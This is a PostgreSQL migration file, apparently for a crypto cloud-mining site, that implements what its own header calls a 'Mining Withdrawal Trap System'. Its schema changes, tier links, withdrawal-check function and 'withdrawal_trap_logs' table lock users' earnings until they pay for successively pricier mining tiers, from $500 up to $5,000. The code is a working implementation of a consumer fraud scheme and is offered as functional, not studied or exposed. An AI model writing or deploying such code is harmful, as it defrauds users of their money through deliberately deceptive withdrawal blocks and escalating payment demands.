/*
  # Mining Withdrawal Trap System

  This creates an aggressive monetization system where users are FORCED to upgrade to withdraw earnings.

  ## System Logic
  
  1. **CPU Miner (Tier 1)**: One-time use only, earns $130
     - After collection, equipment becomes LOCKED
     - User MUST buy Tier 2 to withdraw any money
  
  2. **ASIC S19 (Tier 2)**: Costs $500, earns $835
     - User can only withdraw if they buy Tier 3
  
  3. **ASIC S19 Pro (Tier 3)**: Costs $1000, earns $1670
     - User can only withdraw if they buy Tier 4
  
  4. **ASIC Mining Farm (Tier 4)**: Costs $2000, earns $3340
     - User can only withdraw if they buy Tier 5
  
  5. **Quantum Datacenter (Tier 5)**: Costs $5000, earns $8350
     - User can finally withdraw everything

  ## Changes
  
  - Add `tier` column to mining_equipment_types
  - Add `next_tier_required_for_withdrawal` column
  - Add `max_uses` column (CPU Miner = 1, others = 999)
  - Add `times_used` column to user_mining_equipment
  - Add `can_withdraw` flag to user profiles
  - Create withdrawal_restrictions table
*/

-- Add tier system to equipment types
ALTER TABLE mining_equipment_types 
ADD COLUMN IF NOT EXISTS tier INTEGER DEFAULT 1,
ADD COLUMN IF NOT EXISTS next_tier_id UUID REFERENCES mining_equipment_types(id),
ADD COLUMN IF NOT EXISTS max_uses INTEGER DEFAULT 999,
ADD COLUMN IF NOT EXISTS blocks_withdrawal BOOLEAN DEFAULT false;

-- Add usage tracking to user equipment
ALTER TABLE user_mining_equipment
ADD COLUMN IF NOT EXISTS times_used INTEGER DEFAULT 0,
ADD COLUMN IF NOT EXISTS is_locked BOOLEAN DEFAULT false;

-- Update equipment types with tier system
UPDATE mining_equipment_types SET 
  tier = 1,
  max_uses = 1,
  blocks_withdrawal = true
WHERE name = 'CPU Miner';

UPDATE mining_equipment_types SET 
  tier = 2,
  blocks_withdrawal = true
WHERE name = 'ASIC Miner S19';

UPDATE mining_equipment_types SET 
  tier = 3,
  blocks_withdrawal = true
WHERE name = 'ASIC Miner S19 Pro';

UPDATE mining_equipment_types SET 
  tier = 4,
  blocks_withdrawal = true
WHERE name = 'ASIC Mining Farm';

UPDATE mining_equipment_types SET 
  tier = 5,
  blocks_withdrawal = false
WHERE name = 'Quantum Mining Datacenter';

-- Link tiers together (each requires next tier for withdrawal)
DO $$
DECLARE
  cpu_id UUID;
  asic_id UUID;
  asic_pro_id UUID;
  farm_id UUID;
  quantum_id UUID;
BEGIN
  SELECT id INTO cpu_id FROM mining_equipment_types WHERE name = 'CPU Miner';
  SELECT id INTO asic_id FROM mining_equipment_types WHERE name = 'ASIC Miner S19';
  SELECT id INTO asic_pro_id FROM mining_equipment_types WHERE name = 'ASIC Miner S19 Pro';
  SELECT id INTO farm_id FROM mining_equipment_types WHERE name = 'ASIC Mining Farm';
  SELECT id INTO quantum_id FROM mining_equipment_types WHERE name = 'Quantum Mining Datacenter';

  UPDATE mining_equipment_types SET next_tier_id = asic_id WHERE id = cpu_id;
  UPDATE mining_equipment_types SET next_tier_id = asic_pro_id WHERE id = asic_id;
  UPDATE mining_equipment_types SET next_tier_id = farm_id WHERE id = asic_pro_id;
  UPDATE mining_equipment_types SET next_tier_id = quantum_id WHERE id = farm_id;
END $$;

-- Create function to check if user can withdraw
CREATE OR REPLACE FUNCTION can_user_withdraw_mining_earnings(p_user_id UUID)
RETURNS BOOLEAN
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  v_highest_tier INTEGER;
  v_has_blocking_equipment BOOLEAN;
BEGIN
  -- Get user's highest tier equipment
  SELECT COALESCE(MAX(met.tier), 0)
  INTO v_highest_tier
  FROM user_mining_equipment ume
  JOIN mining_equipment_types met ON ume.equipment_type_id = met.id
  WHERE ume.user_id = p_user_id;

  -- Check if user has any blocking equipment with earnings
  SELECT EXISTS(
    SELECT 1
    FROM user_mining_equipment ume
    JOIN mining_equipment_types met ON ume.equipment_type_id = met.id
    WHERE ume.user_id = p_user_id
      AND met.blocks_withdrawal = true
      AND ume.total_earned_usdt > 0
      AND NOT EXISTS(
        -- User hasn't bought the next tier yet
        SELECT 1
        FROM user_mining_equipment ume2
        WHERE ume2.user_id = p_user_id
          AND ume2.equipment_type_id = met.next_tier_id
      )
  ) INTO v_has_blocking_equipment;

  -- User can withdraw only if they don't have blocking equipment
  RETURN NOT v_has_blocking_equipment;
END;
$$;

-- Create table to track withdrawal attempts
CREATE TABLE IF NOT EXISTS withdrawal_trap_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES user_profiles(id),
  attempted_amount NUMERIC(20,8) NOT NULL,
  blocked_by_tier INTEGER NOT NULL,
  required_tier INTEGER NOT NULL,
  created_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE withdrawal_trap_logs ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users can view own withdrawal trap logs"
  ON withdrawal_trap_logs FOR SELECT
  TO authenticated
  USING (user_id = auth.uid());
